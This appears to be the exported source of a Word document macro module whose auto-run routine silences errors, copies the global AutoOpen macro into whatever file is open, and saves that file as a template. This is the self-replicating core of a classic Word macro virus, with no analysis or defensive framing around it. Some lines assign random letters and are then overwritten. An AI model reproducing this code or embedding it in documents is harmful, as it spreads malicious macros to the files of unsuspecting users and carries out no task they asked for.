   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub Main()
   Dim char1$
   Dim char2$
       On Error Resume Next
       char1$ = Chr(WordBasic.Int(Rnd() * (90 - 65) + 65))
       char2$ = Chr(WordBasic.Int(Rnd() * (90 - 65) + 65))
       char1$ = "Global:AutoOpen"
       char2$ = WordBasic.[FileName$]() + ":AutoOpen"
       If char1$ <> char2$ Then WordBasic.MacroCopy char1$, char2$, 1
       If char1$ <> char2$ Then WordBasic.MacroCopy char1$, char2$, 1
       If char1$ <> char2$ Then WordBasic.FileSaveAs Format:=1
       'EndIf
   End Sub
